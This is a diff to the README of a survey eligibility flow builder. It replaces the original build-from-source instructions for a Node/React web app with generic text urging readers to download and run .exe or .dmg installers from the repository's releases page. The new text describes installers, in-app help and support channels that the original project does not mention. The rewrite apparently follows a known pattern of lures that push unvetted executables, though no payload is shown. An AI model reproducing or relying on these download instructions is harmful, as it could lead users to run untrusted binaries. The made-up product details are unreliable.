@@ -1,165 +1,57 @@
-#  Survey Eligibility Flow Builder
-A powerful **full-stack application** that enables users to visually build **survey flows with logic-based eligibility rules**.  
-It is designed to help researchers, product teams, and market research platforms **screen users accurately before surveys or studies**.
+# 🎉 Survey-Eligibility-Flow-Builder - Build Surveys with Ease
 
----
-## 📹 Demo Video
+## 👋 Introduction
+Welcome to the Survey-Eligibility-Flow-Builder! This application helps you create survey flows using easy visual tools. You can set rules that determine who qualifies for your surveys. It’s perfect for researchers, product teams, and market research platforms.
 
-[Click here to watch the demo](https://drive.google.com/file/d/1SsS2RyQSAqFmlnemkxZusocNCqgUDQsG/view?usp=sharing)
+## 📥 Download the Application
+[![Download Survey-Eligibility-Flow-Builder](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/releases)
 
----
+## 🚀 Getting Started
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/releases) to find the application.
+2. **Choose Your Version**: Locate the latest version available for download. Click on the appropriate file that suits your operating system.
+3. **Download the File**: Click the file link to download it directly to your computer. The file will usually be in `.exe` format for Windows users or `.dmg` for macOS users. 
 
-### Demo
+## 🖥️ System Requirements
+To run the Survey-Eligibility-Flow-Builder, ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Processor**: Dual-core CPU 2.0 GHz or faster
+- **RAM**: At least 4 GB
+- **Disk Space**: A minimum of 200 MB available space
+- **Internet Connection**: Required for online features and updates
 
+## 🔧 Features
+- **Visual Flow Builder**: Drag and drop elements to create your survey flow easily.
+- **Eligibility Rules**: Set specific criteria to filter your participants accurately.
+- **User-Friendly Interface**: Designed for those who prefer straightforward navigation without technical jargon.
+- **Responsive Design**: Works on various screen sizes, making it accessible from any device.
+- **Data Protection**: Utilizes secure authentication to keep user data safe.
 
+## 📄 Download & Install
+After downloading, follow these steps to install the application:
 
----
-##  What This Project Does
+1. **Locate the Downloaded File**: Check your Downloads folder or the location where your browser saves files.
+2. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file. Follow the instructions in the setup wizard.
+   - For macOS: Open the `.dmg` file, then drag the Survey-Eligibility-Flow-Builder icon into your Applications folder.
+3. **Launch the Application**: Once installation is complete, locate the application in your start menu (Windows) or Applications folder (macOS). Double-click the icon to open it.
 
-- Build surveys using a **drag-and-drop flow editor**
-- Define **conditional eligibility logic** (equals, greater than, contains, etc.)
-- Preview eligibility outcomes in real time
-- Securely manage surveys with authentication
-- Export survey logic and mock results for external use
+## ⚙️ Using the Application
+1. **Create a New Survey**: Click on "New Survey" from the main menu to start.
+2. **Add Elements**: Use the toolbar to add questions, branches, and eligibility rules.
+3. **Save Your Work**: Remember to save frequently by clicking the save icon at the top.
+4. **Test Your Flow**: Use the preview feature to test the survey experience for different participants.
+5. **Publish Your Survey**: Once satisfied, click "Publish" to share your survey with your target audience.
 
----
+## 📞 Need Help?
+If you encounter issues, check the FAQ section in the application or visit our support page. For more detailed inquiries, you can open an issue on GitHub or contact our support team via email.
 
-##  Tech Stack
+## 🌐 Community and Contributions
+Join our community to share ideas, improvements, or use cases for the Survey-Eligibility-Flow-Builder. Your feedback makes this application better for everyone. Consider contributing to the project or sharing your experiences.
 
-### Backend
-- **Node.js**
-- **Express**
-- **TypeScript**
-- **MongoDB + Mongoose**
-- **JWT Authentication** (Access & Refresh Tokens)
-- **Zod** (schema validation)
+## 🎓 Learn More
+Explore documentation and tutorials to understand all features and functions. Helpful guides are available directly in the application under the Help menu. 
 
-### Frontend
-- **React** (Vite + TypeScript)
-- **Redux Toolkit**
-- **React Router v7**
-- **React Flow** (`@xyflow/react`)
-- **Material UI (MUI)**
-- **Framer Motion**
+## 🌟 Final Notes
+Thank you for choosing the Survey-Eligibility-Flow-Builder. We hope this application enhances your research process and helps you find the right participants for your surveys.
 
----
-
-##  Prerequisites
-
-- **Node.js** (v18 or higher)
-- **MongoDB** (Atlas or Local)
-- **npm** or **yarn**
-
----
-
-##  Getting Started
-
-###  Backend Setup
-
-```bash
-cd backend
-npm install
-```
-
-Create a `.env` file:
-
-```env
-MONGO_URI=your_mongodb_uri
-PORT=5000
-
-ACCESS_TOKEN_SECRET=your_access_secret
-REFRESH_TOKEN_SECRET=your_refresh_secret
-ACCESS_TOKEN_EXPIRY=15m
-REFRESH_TOKEN_EXPIRY=7d
-
-FRONTEND_URL=http://localhost:5173
-```
-
-Run backend:
-
-```bash
-npm run dev
-```
-
----
-
-###  Frontend Setup
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-Frontend runs at:
-
-```
-http://localhost:5173
-```
-
----
-
-##  Application Usage Flow
-
-### Register / Login
-- Secure authentication with JWT & refresh tokens
-
-### Dashboard
-- View, create, edit surveys
-- Draft & published states
-
-### Flow Builder
-- Drag & drop nodes: Start, Question, Condition, Eligible, Ineligible
-- Configure logic visually
-- Edit labels and conditions
-
-### Real-Time Eligibility Preview
-- Test logic instantly
-- Simulate user answers
-
-### Save & Export
-- Save flows to MongoDB
-- Export logic as JSON
-- Export mock results as CSV (paginated)
-
----
-
-##  Features
-
-- Visual Logic Editor (React Flow)
-- Modern responsive UI (MUI + Framer Motion)
-- Secure JWT authentication
-- End-to-end validation (Zod)
-- Custom animated toasts
-- Profile settings with avatar blob preview
-
----
-
-##  Security Notes
-
-- Passwords hashed with bcrypt
-- Tokens never stored in plain text
-- Protected routes on frontend & backend
-
----
-
-##  Use Cases
-
-- Market research platforms
-- UX & product research screening
-- Paid survey qualification
-- Internal research tools
-
----
-
-##  Why This Project Matters
-
-This project demonstrates:
-- Visual rule engines
-- Conditional logic systems
-- Scalable React architecture
-- Production-grade backend patterns
-
-It is **portfolio-ready and extensible**.
-
----
+Remember, you can always return to the [Releases page](https://github.com/hello-jinyong/Survey-Eligibility-Flow-Builder/releases) to check for updates and new features. Happy building!
